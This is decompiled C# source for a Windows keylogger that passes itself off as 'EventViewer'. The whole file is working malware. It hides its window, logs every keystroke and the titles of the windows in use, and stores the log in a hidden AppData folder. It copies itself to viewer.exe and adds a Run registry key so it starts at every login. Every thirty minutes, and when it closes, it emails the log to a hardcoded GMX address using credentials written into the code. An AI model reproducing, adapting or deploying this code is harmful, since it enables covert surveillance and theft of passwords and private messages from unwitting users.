using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using WindowsApplication.My;

namespace WindowsApplication;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("Timer4")]
	private Timer _Timer4;

	[AccessedThroughProperty("Timer3")]
	private Timer _Timer3;

	[AccessedThroughProperty("Timer5")]
	private Timer _Timer5;

	[AccessedThroughProperty("Timer6")]
	private Timer _Timer6;

	[AccessedThroughProperty("Timer7")]
	private Timer _Timer7;

	public NetworkStream stream;

	public StreamReader sr;

	private string Aktuell;

	private string Alt;

	private string OldData;

	private bool Getippt;

	private object username;

	private string speicherpfad;

	private string message;

	private string an;

	private string server;

	private string user;

	private string password;

	private string newname;

	private long nOldHWnd;

	private string sOldText;

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer4_Tick;
			if (_Timer4 != null)
			{
				_Timer4.remove_Tick(eventHandler);
			}
			_Timer4 = value;
			if (_Timer4 != null)
			{
				_Timer4.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer3 = value;
		}
	}

	internal virtual Timer Timer5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer5 = value;
		}
	}

	internal virtual Timer Timer6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer6 = value;
		}
	}

	internal virtual Timer Timer7
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer7_Tick;
			if (_Timer7 != null)
			{
				_Timer7.remove_Tick(eventHandler);
			}
			_Timer7 = value;
			if (_Timer7 != null)
			{
				_Timer7.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		username = "";
		speicherpfad = "";
		an = "vba2get@gmx.at";
		server = "mail.gmx.net";
		user = "vba2@gmx.at";
		password = "hackedxD";
		newname = "viewer";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Expected O, but got Unknown
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_008d: Expected O, but got Unknown
		components = new Container();
		TextBox1 = new TextBox();
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		Timer4 = new Timer(components);
		Timer3 = new Timer(components);
		Timer5 = new Timer(components);
		Timer6 = new Timer(components);
		Timer7 = new Timer(components);
		((Control)this).SuspendLayout();
		TextBox textBox = TextBox1;
		Point location = new Point(12, 12);
		((Control)textBox).set_Location(location);
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		((TextBoxBase)TextBox1).set_ReadOnly(true);
		TextBox1.set_ScrollBars((ScrollBars)3);
		TextBox textBox2 = TextBox1;
		Size size = new Size(488, 355);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(1);
		Timer1.set_Enabled(true);
		Timer1.set_Interval(1);
		Timer2.set_Enabled(true);
		Timer2.set_Interval(1);
		Timer4.set_Enabled(true);
		Timer4.set_Interval(1800000);
		Timer3.set_Enabled(true);
		Timer3.set_Interval(1000);
		Timer5.set_Interval(1000);
		Timer6.set_Interval(1000);
		Timer7.set_Enabled(true);
		Timer7.set_Interval(180000);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)0);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		size = new Size(507, 376);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("EventViewer");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void write()
	{
		string text = "";
		Encoding aSCII = Encoding.ASCII;
		StreamWriter streamWriter = new StreamWriter(speicherpfad, append: false, aSCII);
		text = TextBox1.get_Text();
		streamWriter.Write(text);
		streamWriter.Close();
	}

	private void send()
	{
		MailMessage mailMessage = new MailMessage();
		try
		{
			mailMessage.From = new MailAddress(user);
			mailMessage.To.Add(an);
			mailMessage.Subject = ((ServerComputer)MyProject.Computer).get_Name();
			mailMessage.Body = TextBox1.get_Text();
			SmtpClient smtpClient = new SmtpClient(server);
			smtpClient.Port = 587;
			smtpClient.EnableSsl = true;
			smtpClient.Credentials = new NetworkCredential(user, password);
			smtpClient.Send(mailMessage);
			TextBox1.set_Text("");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(speicherpfad);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			write();
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern void Sleep(long dwMilliseconds);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long GetForegroundWindow();

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long GetWindowTextLengthA(long hwnd);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long GetWindowTextA(long hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, long cch);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long SetWindowTextA(long hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern short GetAsyncKeyState(int vKey);

	public bool GetKeyState(int key1, int key2 = -1, int key3 = -1)
	{
		if (GetAsyncKeyState(key1) == 0)
		{
			return false;
		}
		if (key2 > -1 && GetAsyncKeyState(key2) == 0)
		{
			return false;
		}
		if (key3 > -1 && GetAsyncKeyState(key3) == 0)
		{
			return false;
		}
		return true;
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		int num = 1;
		string text = default(string);
		do
		{
			long num2 = 0L;
			num2 = GetAsyncKeyState(num);
			if (num2 == -32767L)
			{
				text = Conversions.ToString(Strings.Chr(num));
				switch (num)
				{
				case 1:
					text = null;
					break;
				case 2:
					text = null;
					break;
				case 8:
					text = "[Del]";
					break;
				case 16:
					text = null;
					break;
				case 9:
					text = "[Tab]";
					break;
				case 17:
					text = "[Strg]";
					break;
				case 18:
					text = "[Alt]";
					break;
				case 37:
					text = "[Links]";
					break;
				case 38:
					text = "[Rauf]";
					break;
				case 39:
					text = "[Rechts]";
					break;
				case 40:
					text = "[Runter]";
					break;
				case 46:
					text = "[Entf]";
					break;
				case 91:
					text = "[WindowsTaste]";
					break;
				case 96:
					text = "0";
					break;
				case 97:
					text = "1";
					break;
				case 98:
					text = "2";
					break;
				case 99:
					text = "3";
					break;
				case 100:
					text = "4";
					break;
				case 101:
					text = "5";
					break;
				case 102:
					text = "6";
					break;
				case 103:
					text = "7";
					break;
				case 104:
					text = "8";
					break;
				case 105:
					text = "9";
					break;
				case 106:
					text = "*";
					break;
				case 107:
					text = "+";
					break;
				case 109:
					text = "-";
					break;
				case 110:
					text = ",";
					break;
				case 111:
					text = "/";
					break;
				case 112:
					text = "[F1]";
					break;
				case 113:
					text = "[F2]";
					break;
				case 114:
					text = "[F3]";
					break;
				case 115:
					text = "[F4]";
					break;
				case 116:
					text = "[F5]";
					break;
				case 117:
					text = "[F6]";
					break;
				case 118:
					text = "[F7]";
					break;
				case 119:
					text = "[F8]";
					break;
				case 120:
					text = "[F9]";
					break;
				case 121:
					text = "[F10]";
					break;
				case 122:
					text = "[F11]";
					break;
				case 123:
					text = "[F12]";
					break;
				case 160:
					text = null;
					break;
				case 161:
					text = null;
					break;
				case 162:
					text = "[Strg]";
					break;
				case 164:
					text = "[Alt]";
					break;
				case 186:
					text = "[ue]";
					break;
				case 187:
					text = "+";
					break;
				case 188:
					text = ",";
					break;
				case 189:
					text = "-";
					break;
				case 190:
					text = ".";
					break;
				case 191:
					text = "#";
					break;
				case 192:
					text = "[oe]";
					break;
				case 219:
					text = "[ss]";
					break;
				case 220:
					text = "^";
					break;
				case 221:
					text = "\u00b4";
					break;
				case 222:
					text = "[ae]";
					break;
				case 226:
					text = "<";
					break;
				}
				if (num == 13)
				{
					text = "\r\n";
					break;
				}
			}
			num = checked(num + 1);
		}
		while (num <= 255);
		if (Operators.CompareString(text, "¥", false) == 0)
		{
			text = "[AltGr]";
		}
		else if (Operators.CompareString(text, "£", false) == 0)
		{
			text = "[Strg]";
		}
		if (Operators.CompareString(text, (string)null, false) == 0)
		{
			return;
		}
		if ((((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() || ((Computer)MyProject.Computer).get_Keyboard().get_CapsLock()) ? true : false)
		{
			SwitchTargetFenster1();
			switch (text)
			{
			case "1":
				text = "!";
				break;
			case "2":
				text = "'";
				break;
			case "3":
				text = "§";
				break;
			case "4":
				text = "$";
				break;
			case "5":
				text = "%";
				break;
			case "6":
				text = "&";
				break;
			case "7":
				text = "/";
				break;
			case "8":
				text = "(";
				break;
			case "9":
				text = ")";
				break;
			case "0":
				text = "=";
				break;
			case "[ss]":
				text = "?";
				break;
			case "[oe]":
				text = "[OE]";
				break;
			case "[ae]":
				text = "[AE]";
				break;
			case "[ue]":
				text = "[UE]";
				break;
			case "\u00b4":
				text = "`";
				break;
			case "<":
				text = ">";
				break;
			case ",":
				text = ";";
				break;
			case ".":
				text = ":";
				break;
			case "-":
				text = "_";
				break;
			case "#":
				text = "'";
				break;
			case "+":
				text = "*";
				break;
			}
			getActiveWindow_Self();
			TextBox textBox = TextBox1;
			textBox.set_Text(textBox.get_Text() + text);
		}
		else if (((Computer)MyProject.Computer).get_Keyboard().get_AltKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_CtrlKeyDown())
		{
			if (Operators.CompareString(text, "q", false) == 0)
			{
				text = "@";
			}
			else if (Operators.CompareString(text, "Q", false) == 0)
			{
				text = "@";
			}
			getActiveWindow_Self();
			TextBox textBox = TextBox1;
			textBox.set_Text(textBox.get_Text() + text);
		}
		else
		{
			getActiveWindow_Self();
			SwitchTargetFenster1();
			TextBox textBox = TextBox1;
			textBox.set_Text(textBox.get_Text() + text.ToLower());
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		send();
	}

	public string getActiveWindow_Self()
	{
		checked
		{
			try
			{
				string text = null;
				Alt = Aktuell;
				long foregroundWindow = GetForegroundWindow();
				if (nOldHWnd != 0L)
				{
					SetWindowTextA(nOldHWnd, ref sOldText);
				}
				if (foregroundWindow != nOldHWnd)
				{
					long windowTextLengthA = GetWindowTextLengthA(foregroundWindow);
					text = Strings.Space((int)(windowTextLengthA + 1L));
					GetWindowTextA(foregroundWindow, ref text, windowTextLengthA + 1L);
					sOldText = text;
					Aktuell = text;
					if (Operators.CompareString(Aktuell, Alt, false) != 0)
					{
						return text;
					}
				}
				else
				{
					text = sOldText;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return null;
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		Timer2.Stop();
	}

	private void SwitchTargetFenster1()
	{
		if (Operators.CompareString(Aktuell, Alt, false) != 0 && Operators.CompareString(Aktuell, "", false) != 0 && Operators.CompareString(Aktuell, (string)null, false) != 0)
		{
			Aktuell = Aktuell.Replace("ö", "[oe]");
			Aktuell = Aktuell.Replace("ä", "[ae]");
			Aktuell = Aktuell.Replace("ü", "[ue]");
			Aktuell = Aktuell.Replace("ß", "[ss]");
			TextBox textBox = TextBox1;
			textBox.set_Text(textBox.get_Text() + "\r\n-------------------\r\n" + Aktuell);
			textBox = TextBox1;
			textBox.set_Text(textBox.get_Text() + ":\r\n");
		}
	}

	private void Timer4_Tick(object sender, EventArgs e)
	{
		if (Operators.CompareString(TextBox1.get_Text().Trim(), "", false) != 0)
		{
			send();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(-1.0);
		int num = 1;
		username = MyProject.User.get_Name();
		username = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(username, (Type)null, "Remove", new object[2]
		{
			0,
			Operators.AddObject(NewLateBinding.LateGet(username, (Type)null, "IndexOf", new object[1] { "\\" }, (string[])null, (Type[])null, (bool[])null), (object)1)
		}, (string[])null, (Type[])null, (bool[])null));
		speicherpfad = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"C:\\Users\\", username), (object)"\\AppData\\Local\\Microsoft\\Event Viewer\\log.txt"));
		while (num <= speicherpfad.LastIndexOf("\\"))
		{
			string text = speicherpfad;
			num = text.IndexOf("\\", num);
			text = text.Remove(num);
			try
			{
				if (!((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(text))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().CreateDirectory(text);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			num = checked(num + 1);
		}
		if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(speicherpfad))
		{
			StreamReader streamReader = new StreamReader(speicherpfad);
			OldData = streamReader.ReadToEnd();
			streamReader.Close();
			TextBox1.set_Text("Old Data:\r\n" + OldData + "\r\n");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(speicherpfad);
		}
		save();
	}

	private void save()
	{
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Assembly.GetEntryAssembly()!.Location, Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"C:\\Users\\", username), (object)"\\AppData\\Local\\Microsoft\\Event Viewer\\"), (object)newname), (object)".exe")));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(100);
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			Thread.Sleep(222);
			registryKey.SetValue("Viewer", Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"C:\\Users\\", username), (object)"\\AppData\\Local\\Microsoft\\Event Viewer\\"), (object)newname), (object)".exe"));
			Thread.Sleep(30);
			registryKey.Close();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.ToString(), (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer7_Tick(object sender, EventArgs e)
	{
		write();
	}
}
